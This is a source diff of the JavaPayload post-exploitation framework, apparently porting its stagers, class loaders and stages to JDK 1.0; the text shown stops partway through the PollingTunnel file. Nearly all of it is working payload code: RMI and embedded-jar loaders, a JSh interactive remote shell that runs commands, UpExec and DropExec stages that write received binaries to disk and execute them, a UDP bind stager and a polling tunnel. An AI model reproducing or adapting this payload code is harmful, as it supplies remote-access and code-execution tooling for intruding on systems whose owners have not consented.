@@ -1,0 +1,922 @@
+diff U3 javapayload/builder/SpawnTemplate.java javapayload/builder/SpawnTemplate.java
+--- javapayload/builder/SpawnTemplate.java	Thu Jan 15 10:14:12 1970
++++ javapayload/builder/SpawnTemplate.java	Thu Jan 15 10:14:12 1970
+@@ -37,10 +37,7 @@
+ import java.io.File;
+ import java.io.FileOutputStream;
+ import java.io.IOException;
+-import java.util.ArrayList;
+-import java.util.Arrays;
+-import java.util.List;
+-import java.util.Locale;
++import java.util.Vector;
+ import java.util.Stack;
+ import java.util.StringTokenizer;
+ 
+@@ -51,13 +48,14 @@
+ 	private boolean ready = false;
+ 	
+ 	public void bootstrap(String[] parameters, boolean needWait) throws Exception {
+-		File tempFile = File.createTempFile("~spawn", ".tmp");
+-		tempFile.delete();
+-		File tempDir = new File(tempFile.getAbsolutePath()+".dir");
++		File tempDir = new File("~spawn"+Math.random()+".tmp.dir");
+ 		tempDir.mkdir();
+-		tempFile = new File(tempDir, "SpawnedClass.class");
++		File tempFile = new File(tempDir, "SpawnedClass.class");
+ 		FileOutputStream fos = new FileOutputStream(tempFile);
+-		fos.write("TO_BE_REPLACED".getBytes("ISO-8859-1"));
++		String tmp = "TO_BE_REPLACED";
++		byte[] data = new byte[tmp.length()];
++		tmp.getBytes(0, tmp.length(), data, 0);
++		fos.write(data);
+ 		fos.close();
+ 		if (parameters[0].startsWith("Spawn"))
+ 			parameters[0] = parameters[0].substring(5);
+@@ -90,16 +88,20 @@
+ 	}
+ 
+ 	private static String[] buildCommandLine(String className, String classPath, String[] args) {
+-		List commands = new ArrayList();
++		Vector commands = new Vector();
+ 		String vm = getJreExecutable("java");
+-	    commands.add(vm);
++	    commands.addElement(vm);
+ 		if (classPath.length() > 0) {
+-		    commands.add("-classpath");
+-		    commands.add(classPath);
++		    commands.addElement("-classpath");
++		    commands.addElement(classPath);
++		}
++		commands.addElement(className);
++		for (int i = 0; i < args.length; i++) {
++			commands.addElement(args[i]);
+ 		}
+-		commands.add(className);
+-		commands.addAll(Arrays.asList(args));
+-		return (String[]) commands.toArray(new String[commands.size()]);
++		String[] result = new String[commands.size()];
++		commands.copyInto(result);
++		return result;
+ 	}
+ 	
+     public static final String FAMILY_NETWARE = "netware";
+@@ -136,7 +138,7 @@
+     }
+ 
+     private static final String OS_NAME =
+-        System.getProperty("os.name").toLowerCase(Locale.ENGLISH);
++        System.getProperty("os.name").toLowerCase();
+     private static final String PATH_SEP =
+         System.getProperty("path.separator");
+     
+diff U3 javapayload/loader/rmi/Loader.java javapayload/loader/rmi/Loader.java
+--- javapayload/loader/rmi/Loader.java	Thu Jan 15 10:14:12 1970
++++ javapayload/loader/rmi/Loader.java	Thu Jan 15 10:14:12 1970
+@@ -36,15 +36,23 @@
+ 
+ import java.io.ObjectStreamException;
+ import java.io.Serializable;
+-import java.net.URL;
+-import java.security.AllPermission;
+-import java.security.CodeSource;
+-import java.security.Permissions;
+-import java.security.ProtectionDomain;
+-import java.security.cert.Certificate;
++import java.util.Hashtable;
+ 
+ public class Loader extends ClassLoader implements Serializable {
+ 
++	private Hashtable classCache = new Hashtable();
++	
++	protected synchronized Class loadClass(String name, boolean resolve) throws ClassNotFoundException {
++		Class c = (Class)classCache.get(name);
++		if (c == null) {
++			c = findSystemClass(name);
++		}
++		if (resolve) {
++			resolveClass(c);
++		}
++		return c;
++	}
++
+ 	public byte[][] classes;
+ 
+ 	public Object[] parameters;
+@@ -53,9 +61,8 @@
+ 		try {
+ 			Class clazz = null;
+ 			for (int i = 0; i < classes.length; i++) {
+-				Permissions permissions = new Permissions();
+-				permissions.add(new AllPermission());
+-				clazz = defineClass(null, classes[i], 0, classes[i].length, new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions));
++				clazz = defineClass(classes[i], 0, classes[i].length);
++				classCache.put(clazz.getName(), clazz);
+ 			}
+ 			clazz.getConstructor(new Class[] { Object[].class }).newInstance(new Object[] { parameters });
+ 		} catch (Throwable t) {
+diff U3 javapayload/loader/rmi/StagerInitializer.java javapayload/loader/rmi/StagerInitializer.java
+--- javapayload/loader/rmi/StagerInitializer.java	Thu Jan 15 10:14:12 1970
++++ javapayload/loader/rmi/StagerInitializer.java	Thu Jan 15 10:14:12 1970
+@@ -34,18 +34,15 @@
+ 
+ package javapayload.loader.rmi;
+ 
+-import java.security.AccessController;
+-import java.security.PrivilegedExceptionAction;
+-
+ import javapayload.stager.Stager;
+ 
+-public class StagerInitializer implements PrivilegedExceptionAction {
++public class StagerInitializer {
+ 
+ 	private Object[] args;
+ 
+ 	public StagerInitializer(Object[] args) throws Exception {
+ 		this.args = args;
+-		AccessController.doPrivileged(this);
++		run();
+ 	}
+ 
+ 	public Object run() throws Exception {
+@@ -53,9 +50,6 @@
+ 		Stager stager = (Stager) Class.forName("javapayload.stager." + stagerArgs[0]).newInstance();
+ 		new StagerThread(stager, stagerArgs);
+ 		stager.waitReady();
+-		if (args.length > 1) {
+-			new TunnelInitializerLoader(stager, args);
+-		}
+ 		return null;
+ 	}
+ }
+diff U3 javapayload/loader/EmbeddedJarLoader.java javapayload/loader/EmbeddedJarLoader.java
+--- javapayload/loader/EmbeddedJarLoader.java	Thu Jan 15 10:14:12 1970
++++ javapayload/loader/EmbeddedJarLoader.java	Thu Jan 15 10:14:12 1970
+@@ -34,8 +34,8 @@
+ 
+ package javapayload.loader;
+ 
+-import java.util.jar.JarFile;
+-import java.util.jar.Manifest;
++import java.io.InputStream;
++import java.util.Properties;
+ 
+ import javapayload.stager.Stager;
+ 
+@@ -46,10 +46,13 @@
+ 			args[0] = args[0].substring(1);
+ 			needWait = true;
+ 		}
+-		final Manifest manifest = new Manifest(EmbeddedJarLoader.class.getResourceAsStream("/" + JarFile.MANIFEST_NAME));
+-		args = new String[Integer.parseInt(manifest.getMainAttributes().getValue("Argument-Count"))];
++		final Properties manifest = new Properties();
++		InputStream in = EmbeddedJarLoader.class.getResourceAsStream("/META-INF/MANIFEST.MF");
++		manifest.load(in);
++		in.close();
++		args = new String[Integer.parseInt(manifest.getProperty("Argument-Count"))];
+ 		for (int i = 0; i < args.length; i++) {
+-			args[i] = manifest.getMainAttributes().getValue("Argument-" + i);
++			args[i] = manifest.getProperty("Argument-" + i);
+ 		}
+ 		final Stager stager = (Stager) Class.forName("javapayload.stager." + args[0]).newInstance();
+ 		stager.bootstrap(args, needWait);
+diff U3 javapayload/stage/DropExec.java javapayload/stage/DropExec.java
+--- javapayload/stage/DropExec.java	Thu Jan 15 10:14:12 1970
++++ javapayload/stage/DropExec.java	Thu Jan 15 10:14:12 1970
+@@ -43,7 +43,7 @@
+ public class DropExec implements Stage {
+ 
+ 	public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
+-		final String tempfile = File.createTempFile("~upexec", null).getAbsolutePath();
++		final String tempfile = new File("~upexec"+Math.random()).getAbsolutePath();
+ 		for (int i = 0; i < parameters.length; i++) {
+ 			if (parameters[i].equals("--")) {
+ 				// separator found. The next parameter will be the module name, and
+diff U3 javapayload/stage/GZIP.java javapayload/stage/GZIP.java
+--- javapayload/stage/GZIP.java	Thu Jan 15 10:14:12 1970
++++ javapayload/stage/GZIP.java	Thu Jan 15 10:14:12 1970
+@@ -40,12 +40,8 @@
+ import java.io.OutputStream;
+ import java.io.PrintStream;
+ import java.io.SequenceInputStream;
+-import java.net.URL;
+-import java.security.AllPermission;
+-import java.security.CodeSource;
+-import java.security.Permissions;
+-import java.security.ProtectionDomain;
+-import java.security.cert.Certificate;
++
++import java.util.Hashtable;
+ import java.util.zip.GZIPInputStream;
+ 
+ public class GZIP extends ClassLoader implements Stage {
+@@ -64,18 +60,32 @@
+ 		}
+ 	}
+ 	
++	private Hashtable classCache = new Hashtable();
++	
++	protected synchronized Class loadClass(String name, boolean resolve) throws ClassNotFoundException {
++		Class c = (Class)classCache.get(name);
++		if (c == null) {
++			c = findSystemClass(name);
++		}
++		if (resolve) {
++			resolveClass(c);
++		}
++		return c;
++	}
++
+ 	protected final void bootstrap(InputStream rawIn, OutputStream out, String[] parameters) {
+ 		try {
+ 			final DataInputStream in = new DataInputStream(rawIn);
+ 			Class clazz;
+-			final Permissions permissions = new Permissions();
+-			permissions.add(new AllPermission());
+-			final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
++			
++			
++			
+ 			int length = in.readInt();
+ 			do {
+ 				final byte[] classfile = new byte[length];
+ 				in.readFully(classfile);
+-				resolveClass(clazz = defineClass(null, classfile, 0, length, pd));
++				resolveClass(clazz = defineClass(classfile, 0, length));
++				classCache.put(clazz.getName(), clazz);
+ 				length = in.readInt();
+ 				if (length == 0) {
+ 					break;
+diff U3 javapayload/stage/JCp.java javapayload/stage/JCp.java
+--- javapayload/stage/JCp.java	Thu Jan 15 10:14:12 1970
++++ javapayload/stage/JCp.java	Thu Jan 15 10:14:12 1970
+@@ -34,6 +34,7 @@
+ 
+ package javapayload.stage;
+ 
++import java.io.ByteArrayOutputStream;
+ import java.io.DataInputStream;
+ import java.io.DataOutputStream;
+ import java.io.File;
+@@ -42,9 +43,7 @@
+ import java.io.IOException;
+ import java.io.InputStream;
+ import java.io.OutputStream;
+-import java.io.PrintWriter;
+-import java.io.StringWriter;
+-import java.text.SimpleDateFormat;
++import java.io.PrintStream;
+ import java.util.Date;
+ 
+ public class JCp implements Stage {
+@@ -97,14 +96,15 @@
+ 					response = "File/directory deleted.";
+ 					break;
+ 				case JCP_LS:
+-					final File[] dir = new File(arg).listFiles();
++					final String[] filenames = new File(arg).list();
+ 					response = "";
+-					if (dir == null) {
++					if (filenames == null) {
+ 						response = "Not a directory: " + arg;
+ 					} else {
+-						response = dir.length + " files/directories in " + arg + "\r\n\r\n";
+-						for (int i = 0; i < dir.length; i++) {
+-							response += dir[i].getName() + "\t" + (dir[i].isDirectory() ? "[DIR]" : "" + dir[i].length()) + "\t" + new SimpleDateFormat("yyyy-MM-dd HH:mm").format(new Date(dir[i].lastModified())) + "\r\n";
++						response = filenames.length + " files/directories in " + arg + "\r\n\r\n";
++						for (int i = 0; i < filenames.length; i++) {
++							File dir = new File(arg, filenames[i]);
++							response += dir.getName() + "\t" + (dir.isDirectory() ? "[DIR]" : "" + dir.length()) + "\t" + formatDate(new Date(dir.lastModified())) + "\r\n";
+ 						}
+ 					}
+ 					break;
+@@ -141,9 +141,9 @@
+ 					throw new IllegalArgumentException("Unsupported mode: " + mode);
+ 				}
+ 			} catch (Exception ex) {
+-				StringWriter sw = new StringWriter();
+-				ex.printStackTrace(new PrintWriter(sw));
+-				response = sw.toString();
++				ByteArrayOutputStream baos = new ByteArrayOutputStream();
++				ex.printStackTrace(new PrintStream(baos));
++				response = new String(baos.toByteArray(), 0);
+ 			}
+ 			if (response == null)
+ 				break;
+@@ -153,5 +153,13 @@
+ 		while (in.read() != -1)
+ 			;
+ 		out.close();
++	}
++
++	private String formatDate(Date date) {
++		/* #JDK1.0 */
++		return new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm").format(date);
++		/*/
++		return date.toString();
++		/**/
+ 	}
+ }
+\ No newline at end of file
+diff U3 javapayload/stage/JSh.java javapayload/stage/JSh.java
+--- javapayload/stage/JSh.java	Thu Jan 15 10:14:12 1970
++++ javapayload/stage/JSh.java	Thu Jan 15 10:14:12 1970
+@@ -46,11 +46,9 @@
+ import java.io.PrintStream;
+ import java.net.Socket;
+ import java.net.URL;
+-import java.text.SimpleDateFormat;
+-import java.util.ArrayList;
+ import java.util.Date;
+ import java.util.Enumeration;
+-import java.util.List;
++import java.util.Vector;
+ 
+ public class JSh implements Stage, Runnable {
+ 
+@@ -59,7 +57,7 @@
+ 	// job[1] = raw object (Socket or Process or Stream) for closing
+ 	// job[2] = OutputStream to forward user input to
+ 	// job[3..length-1] = JshStreamForwarders to redirect output
+-	private final List jobs = new ArrayList();
++	private final Vector jobs = new Vector();
+ 
+ 	private PipedOutputStream signalStream;
+ 	private InputStream originalIn;
+@@ -140,7 +138,7 @@
+ 			for (int i = 3; i < job.length; i++) {
+ 				((JShStreamForwarder) job[i]).pauseForwarding(true);
+ 			}
+-			jobs.add(job);
++			jobs.addElement(job);
+ 			pout.println("Job suspended, see 'jobs'.");
+ 		} else {
+ 			for (int i = 3; i < job.length; i++) {
+@@ -187,7 +185,7 @@
+ 		copier.setDaemon(true);
+ 		copier.start();
+ 		final JShSignalSender ss = new JShSignalSender(signalStream, pout);
+-		File pwd = new File(".").getCanonicalFile();
++		File pwd = canonicalize(new File("."));
+ 		while (true) {
+ 			pout.print("! ");
+ 			// yes I know this is deprecated. but BufferedReader is way too bloated for what we need here
+@@ -221,25 +219,21 @@
+ 				} else if (cmd == "cd") {
+ 					File f = new File(pwd, params);
+ 					if (f.exists() && f.isDirectory()) {
+-						pwd = f.getCanonicalFile();
++						pwd = canonicalize(f);
+ 					} else {
+ 						f = new File(params);
+ 						if (f.exists() && f.isDirectory()) {
+-							pwd = f.getCanonicalFile();
++							pwd = canonicalize(f);
+ 						} else {
+ 							pout.println("Path not found.");
+ 						}
+ 					}
+ 					pout.println(pwd.getPath());
+ 				} else if (cmd == "ls") {
+-					final File[] roots = File.listRoots();
+-					for (int i = 0; i < roots.length; i++) {
+-						pout.println(roots[i].getAbsolutePath() + "\t[ROOT]");
+-					}
+-					pout.println();
+-					final File[] dir = pwd.listFiles();
+-					for (int i = 0; i < dir.length; i++) {
+-						pout.println(dir[i].getName() + "\t" + (dir[i].isDirectory() ? "[DIR]" : "" + dir[i].length()) + "\t" + new SimpleDateFormat("yyyy-MM-dd HH:mm").format(new Date(dir[i].lastModified())));
++					final String[] files = pwd.list();
++					for (int i = 0; i < files.length; i++) {
++						File dir = new File(pwd, files[i]);
++						pout.println(dir.getName() + "\t" + (dir.isDirectory() ? "[DIR]" : "" + dir.length()) + "\t" + formatDate(new Date(dir.lastModified())));
+ 					}
+ 				} else if (cmd == "exec") {
+ 					Process proc;
+@@ -270,10 +264,11 @@
+ 				} else if (cmd == "jobs") {
+ 					if (params.length() == 0) {
+ 						for (int i = 0; i < jobs.size(); i++) {
+-							pout.println((i + 1) + "\t" + ((Object[]) jobs.get(i))[0]);
++							pout.println((i + 1) + "\t" + ((Object[]) jobs.elementAt(i))[0]);
+ 						}
+ 					} else {
+-						handleBackgroundJob(in, (Object[]) jobs.remove(Integer.parseInt(params) - 1));
++						handleBackgroundJob(in, (Object[]) jobs.elementAt(Integer.parseInt(params) - 1));
++						jobs.removeElementAt(Integer.parseInt(params) - 1);
+ 					}
+ 				} else if (cmd == "exit") {
+ 					break;
+@@ -344,5 +339,21 @@
+ 		}
+ 		ss.terminate();
+ 		pout.close();
++	}
++
++	public File canonicalize(File f) throws IOException {
++		/* #JDK1.0 */
++		return new File(f.getCanonicalPath());
++		/*/
++		return new File(f.getAbsolutePath());
++		/**/
++	}
++
++	private String formatDate(Date date) {
++		/* #JDK1.0 */
++		return new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm").format(date);
++		/*/
++		return date.toString();
++		/**/
+ 	}
+ }
+\ No newline at end of file
+diff U3 javapayload/stage/LocalStageMenu.java javapayload/stage/LocalStageMenu.java
+--- javapayload/stage/LocalStageMenu.java	Thu Jan 15 10:14:12 1970
++++ javapayload/stage/LocalStageMenu.java	Thu Jan 15 10:14:12 1970
+@@ -39,17 +39,17 @@
+ import java.io.InputStream;
+ import java.io.OutputStream;
+ import java.io.PrintStream;
+-import java.util.List;
++import java.util.Vector;
+ 
+ public class LocalStageMenu extends StageMenu {
+ 
+-	protected Object[] parseLine(String line, List stages) {
++	protected Object[] parseLine(String line, Vector stages) {
+ 		if (line.indexOf(' ') != -1) 
+ 			return new Object[] {"Custom", splitArgs("StageMenu -- "+line), new byte[0]};
+ 		try {
+ 			int number = Integer.parseInt(line);
+ 			if (number > 0 && number <= stages.size()) {
+-				Object[] stage = (Object[])stages.get(number-1);
++				Object[] stage = (Object[])stages.elementAt(number-1);
+ 				return stage;
+ 			}
+ 		} catch (NumberFormatException ex) {
+@@ -75,8 +75,13 @@
+ 					break;
+ 				}
+ 			}
++			/* #JDK1.0 */
+ 			final Object stage = clazz.newInstance();
+ 			clazz.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(stage, new Object[] { in, out, parameters });
++			/*/
++			final Stage stage = (Stage)clazz.newInstance();
++			stage.start(in, out, parameters);			
++			/**/
+ 		} catch (final Throwable t) {
+ 			t.printStackTrace(new PrintStream(out, true));
+ 		}
+diff U3 javapayload/stage/MultiStage.java javapayload/stage/MultiStage.java
+--- javapayload/stage/MultiStage.java	Thu Jan 15 10:14:12 1970
++++ javapayload/stage/MultiStage.java	Thu Jan 15 10:14:12 1970
+@@ -36,13 +36,12 @@
+ 
+ import java.io.DataInputStream;
+ import java.io.OutputStream;
+-import java.util.ArrayList;
+-import java.util.List;
++import java.util.Vector;
+ 
+ public class MultiStage implements Stage {
+ 
+ 	public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
+-		List/* <MultiStagerClassLoader> */stagers = new ArrayList();
++		Vector/* <MultiStagerClassLoader> */stagers = new Vector();
+ 		while (true) {
+ 			int index = in.readInt();
+ 			if (index == -1)
+@@ -51,9 +50,9 @@
+ 				throw new RuntimeException("Invalid stager index: " + index + " (stagers size = " + stagers.size() + ")");
+ 			}
+ 			if (index == stagers.size()) {
+-				stagers.add(new MultiStageClassLoader(in, out));
++				stagers.addElement(new MultiStageClassLoader(in, out));
+ 			}
+-			MultiStageClassLoader stager = (MultiStageClassLoader) stagers.get(index);
++			MultiStageClassLoader stager = (MultiStageClassLoader) stagers.elementAt(index);
+ 			stager.forward(in);
+ 		}
+ 		while(in.read() != -1)
+diff U3 javapayload/stage/MultiStageClassLoader.java javapayload/stage/MultiStageClassLoader.java
+--- javapayload/stage/MultiStageClassLoader.java	Thu Jan 15 10:14:12 1970
++++ javapayload/stage/MultiStageClassLoader.java	Thu Jan 15 10:14:12 1970
+@@ -43,15 +43,23 @@
+ import java.io.PipedInputStream;
+ import java.io.PipedOutputStream;
+ import java.io.PrintStream;
+-import java.net.URL;
+-import java.security.AllPermission;
+-import java.security.CodeSource;
+-import java.security.Permissions;
+-import java.security.ProtectionDomain;
+-import java.security.cert.Certificate;
++import java.util.Hashtable;
+ 
+ public class MultiStageClassLoader extends ClassLoader implements Runnable {
+ 
++	private Hashtable classCache = new Hashtable();
++	
++	protected synchronized Class loadClass(String name, boolean resolve) throws ClassNotFoundException {
++		Class c = (Class)classCache.get(name);
++		if (c == null) {
++			c = findSystemClass(name);
++		}
++		if (resolve) {
++			resolveClass(c);
++		}
++		return c;
++	}
++	
+ 	private final MultiStageOutputStream msOut;
+ 	private final PipedOutputStream out;
+ 	private final BufferedOutputStream buffOut;
+@@ -89,21 +97,24 @@
+ 		try {
+ 			final DataInputStream in = new DataInputStream(rawIn);
+ 			Class clazz;
+-			final Permissions permissions = new Permissions();
+-			permissions.add(new AllPermission());
+-			final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
+ 			int length = in.readInt();
+ 			do {
+ 				final byte[] classfile = new byte[length];
+ 				in.readFully(classfile);
+-				resolveClass(clazz = defineClass(null, classfile, 0, length, pd));
++				resolveClass(clazz = defineClass(classfile, 0, length));
++				classCache.put(clazz.getName(), clazz);
+ 				length = in.readInt();
+ 				if (length == 0) {
+ 					break;
+ 				}
+ 			} while (length > 0);
++			/* #JDK1.0 */
+ 			final Object stage = clazz.newInstance();
+ 			clazz.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(stage, new Object[] { in, out, parameters });
++			/*/
++			final Stage stage = (Stage)clazz.newInstance();
++			stage.start(in, out, parameters);			
++			/**/
+ 		} catch (final Throwable t) {
+ 			t.printStackTrace(new PrintStream(out, true));
+ 		}
+diff U3 javapayload/stage/MultiStageOutputStream.java javapayload/stage/MultiStageOutputStream.java
+--- javapayload/stage/MultiStageOutputStream.java	Thu Jan 15 10:14:12 1970
++++ javapayload/stage/MultiStageOutputStream.java	Thu Jan 15 10:14:12 1970
+@@ -98,7 +98,7 @@
+ 
+ 	public synchronized void start() throws IOException {
+ 		if (active)
+-			throw new IllegalStateException();
++			throw new RuntimeException();
+ 		out.write(new byte[] { 1, 0 });
+ 		out.flush();
+ 		active = true;
+@@ -107,7 +107,7 @@
+ 
+ 	public synchronized void stop() throws IOException {
+ 		if (!active)
+-			throw new IllegalStateException();
++			throw new RuntimeException();
+ 		out.write(new byte[] { 1, 2 });
+ 		out.flush();
+ 		active = false;
+diff U3 javapayload/stage/StageMenu.java javapayload/stage/StageMenu.java
+--- javapayload/stage/StageMenu.java	Thu Jan 15 10:14:12 1970
++++ javapayload/stage/StageMenu.java	Thu Jan 15 10:14:12 1970
+@@ -41,23 +41,30 @@
+ import java.io.OutputStream;
+ import java.io.PrintStream;
+ import java.io.SequenceInputStream;
+-import java.net.URL;
+-import java.security.AllPermission;
+-import java.security.CodeSource;
+-import java.security.Permissions;
+-import java.security.ProtectionDomain;
+-import java.security.cert.Certificate;
+-import java.util.ArrayList;
+-import java.util.List;
++import java.util.Hashtable;
++import java.util.Vector;
+ import java.util.StringTokenizer;
+ 
+ public class StageMenu extends ClassLoader implements Stage, Runnable {
+ 
++	private Hashtable classCache = new Hashtable();
++	
++	protected synchronized Class loadClass(String name, boolean resolve) throws ClassNotFoundException {
++		Class c = (Class)classCache.get(name);
++		if (c == null) {
++			c = findSystemClass(name);
++		}
++		if (resolve) {
++			resolveClass(c);
++		}
++		return c;
++	}
++	
+ 	private InputStream peekIn;
+ 	private int peekByte = -2;
+ 	
+ 	public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
+-		List stages = parseStages(in, parameters);  // each entry is an Object[] of title, parameters, bytes
++		Vector stages = parseStages(in, parameters);  // each entry is an Object[] of title, parameters, bytes
+ 		String[] bootstrapParams = new String[] {"StageMenu", "--", "SendParameters"};
+ 		peekIn = in;
+ 		new Thread(this).start();
+@@ -77,7 +84,7 @@
+ 			pout.println("Stage menu");
+ 			pout.println();
+ 			for (int j = 0; j < stages.size(); j++) {
+-				pout.println((j+1)+": "+(String)((Object[])stages.get(j))[0]);
++				pout.println((j+1)+": "+(String)((Object[])stages.elementAt(j))[0]);
+ 			}
+ 			pout.println();
+ 			pout.println("Select a stage (you can also stage a stage from JavaPayload or metasploit"+getExtraOption() +").");
+@@ -105,7 +112,7 @@
+ 			parameters[0] = bootstrapParams[0];
+ 	}
+ 	
+-	protected Object[] parseLine(String line, List stages) {
++	protected Object[] parseLine(String line, Vector stages) {
+ 		String params = null;
+ 		if (line.indexOf(' ') != -1) {
+ 			params = line.substring(line.indexOf(' ')+1);
+@@ -114,7 +121,7 @@
+ 		try {
+ 			int number = Integer.parseInt(line);
+ 			if (number > 0 && number <= stages.size()) {
+-				Object[] stage = (Object[])stages.get(number-1);
++				Object[] stage = (Object[])stages.elementAt(number-1);
+ 				if (params != null) {
+ 					stage[1] = splitArgs("StageMenu -- "+params);
+ 				}
+@@ -129,10 +136,10 @@
+ 		return "";
+ 	}
+ 	
+-	private List parseStages(DataInputStream in, String[] parameters) throws IOException {
+-		List stages = new ArrayList();
++	private Vector parseStages(DataInputStream in, String[] parameters) throws IOException {
++		Vector stages = new Vector();
+ 		boolean go = false;
+-		List currentParameters = new ArrayList();
++		Vector currentParameters = new Vector();
+ 		StringBuffer currentTitle = new StringBuffer();
+ 		for (int i = 0; i < parameters.length; i++) {
+ 			if (!go) {
+@@ -143,26 +150,28 @@
+ 				continue;
+ 			}
+ 			if (parameters[i].equals("---")) {
+-				stages.add(parseStage(currentTitle, currentParameters, in));
++				stages.addElement(parseStage(currentTitle, currentParameters, in));
+ 			} else if (parameters[i].startsWith("---")) {
+-				currentParameters.add(parameters[i].substring(1));
++				currentParameters.addElement(parameters[i].substring(1));
+ 				currentTitle.append(" "+parameters[i].substring(1));
+ 			} else {
+-				currentParameters.add(parameters[i]);
++				currentParameters.addElement(parameters[i]);
+ 				currentTitle.append(" "+parameters[i]);
+ 			}
+ 		}
+-		stages.add(parseStage(currentTitle, currentParameters, in));
++		stages.addElement(parseStage(currentTitle, currentParameters, in));
+ 		return stages;
+ 	}
+ 	
+-	private Object[] parseStage(StringBuffer currentTitle, List currentParameters, DataInputStream in) throws IOException {
+-		String title = currentTitle.deleteCharAt(0).toString();
++	private Object[] parseStage(StringBuffer currentTitle, Vector currentParameters, DataInputStream in) throws IOException {
++		String title = currentTitle.toString().substring(1);
+ 		currentTitle.setLength(0);
+-		currentParameters.add(0, "--");
+-		currentParameters.add(0, "StageMenu");
+-		String[] args = (String[]) currentParameters.toArray(new String[currentParameters.size()]);
+-		currentParameters.clear();
++		currentParameters.insertElementAt("--", 0);
++		currentParameters.insertElementAt("StageMenu", 0);
++		
++		String[] args = new String[currentParameters.size()];
++		currentParameters.copyInto(args);
++		currentParameters.removeAllElements();
+ 		return new Object[] { title, args, loadStageBytes(in)}; 
+ 	}
+ 	
+@@ -202,21 +211,24 @@
+ 		try {
+ 			final DataInputStream in = new DataInputStream(rawIn);
+ 			Class clazz;
+-			final Permissions permissions = new Permissions();
+-			permissions.add(new AllPermission());
+-			final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
+ 			int length = in.readInt();
+ 			do {
+ 				final byte[] classfile = new byte[length];
+ 				in.readFully(classfile);
+-				resolveClass(clazz = defineClass(null, classfile, 0, length, pd));
++				resolveClass(clazz = defineClass(classfile, 0, length));
++				classCache.put(clazz.getName(), clazz);
+ 				length = in.readInt();
+ 				if (length == 0) {
+ 					break;
+ 				}
+ 			} while (length > 0);
++			/* #JDK1.0 */
+ 			final Object stage = clazz.newInstance();
+ 			clazz.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(stage, new Object[] { in, out, parameters });
++			/*/
++			final Stage stage = (Stage)clazz.newInstance();
++			stage.start(in, out, parameters);			
++			/**/
+ 		} catch (final Throwable t) {
+ 			t.printStackTrace(new PrintStream(out, true));
+ 		}
+diff U3 javapayload/stage/SystemInfo.java javapayload/stage/SystemInfo.java
+--- javapayload/stage/SystemInfo.java	Thu Jan 15 10:14:12 1970
++++ javapayload/stage/SystemInfo.java	Thu Jan 15 10:14:12 1970
+@@ -34,9 +34,7 @@
+ 
+ package javapayload.stage;
+ 
+-import java.io.BufferedReader;
+ import java.io.DataInputStream;
+-import java.io.InputStreamReader;
+ import java.io.OutputStream;
+ import java.io.PrintStream;
+ import java.net.InetAddress;
+@@ -88,9 +86,9 @@
+ 		pout.println("External IP Address:");
+ 		pout.println("~~~~~~~~~~~~~~~~~~~~");
+ 		try {
+-			BufferedReader br = new BufferedReader(new InputStreamReader(new URL("http://www.ippages.com/simple/").openStream()));
+-			pout.println(br.readLine());
+-			br.close();
++			DataInputStream dis = new DataInputStream(new URL("http://www.ippages.com/simple/").openStream());
++			pout.println(dis.readLine());
++			dis.close();
+ 		} catch (Exception ex) {
+ 			ex.printStackTrace(pout);
+ 		}
+diff U3 javapayload/stage/UpExec.java javapayload/stage/UpExec.java
+--- javapayload/stage/UpExec.java	Thu Jan 15 10:14:12 1970
++++ javapayload/stage/UpExec.java	Thu Jan 15 10:14:12 1970
+@@ -42,7 +42,7 @@
+ public class UpExec implements Stage {
+ 
+ 	public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
+-		final String tempfile = File.createTempFile("~upexec", null).getAbsolutePath();
++		final String tempfile = new File("~upexec"+Math.random()).getAbsolutePath();
+ 		final int length = in.readInt();
+ 		final byte[] data = new byte[length];
+ 		in.readFully(data);
+diff U3 javapayload/stager/BindUDP.java javapayload/stager/BindUDP.java
+--- javapayload/stager/BindUDP.java	Thu Jan 15 10:14:12 1970
++++ javapayload/stager/BindUDP.java	Thu Jan 15 10:14:12 1970
+@@ -83,7 +83,9 @@
+ 		byte[] clazz = baos.toByteArray();
+ 		PipedInputStream in = new PipedInputStream();
+ 		PipedOutputStream pipedOut = new PipedOutputStream(in);
+-		OutputStream out = (OutputStream) defineClass(null, clazz, 0, clazz.length)
++		Class classObject = defineClass(clazz, 0, clazz.length);
++		classCache.put(classObject.getName(), classObject);
++		OutputStream out = (OutputStream) classObject
+ 			.getConstructor(new Class[] {Class.forName("java.io.OutputStream"), Class.forName("java.net.DatagramSocket"), Class.forName("java.net.InetAddress"), Integer.TYPE})
+ 			.newInstance(new Object[] {pipedOut, ds, remoteAddress, new Integer(remotePort)});
+ 		bootstrap(in, out, parameters);
+diff U3 javapayload/stager/Console.java javapayload/stager/Console.java
+--- javapayload/stager/Console.java	Thu Jan 15 10:14:12 1970
++++ javapayload/stager/Console.java	Thu Jan 15 10:14:12 1970
+@@ -41,7 +41,9 @@
+ 
+ 	public void bootstrap(String[] parameters, boolean needWait) throws Exception {
+ 		PrintStream out = System.out;
++		/* #JDK1.0 */
+ 		System.setOut(System.err);
++		/**/
+ 		bootstrap(System.in, out, parameters);
+ 	}
+ 	
+diff U3 javapayload/stager/PollingTunnel.java javapayload/stager/PollingTunnel.java
+--- javapayload/stager/PollingTunnel.java	Thu Jan 15 10:14:12 1970
++++ javapayload/stager/PollingTunnel.java	Thu Jan 15 10:14:12 1970
+@@ -39,12 +39,6 @@
+ import java.io.OutputStream;
+ import java.io.PipedInputStream;
+ import java.io.PipedOutputStream;
+-import java.net.URL;
+-import java.security.AllPermission;
+-import java.security.CodeSource;
+-import java.security.Permissions;
+-import java.security.ProtectionDomain;
+-import java.security.cert.Certificate;
+ 
+ public class PollingTunnel extends Stager implements Runnable {
+ 
+@@ -140,11 +134,9 @@
+ 			}
+ 		} else if (data.startsWith("9")) {
+ 			byte[] classfile = decodeASCII85(data.substring(1));
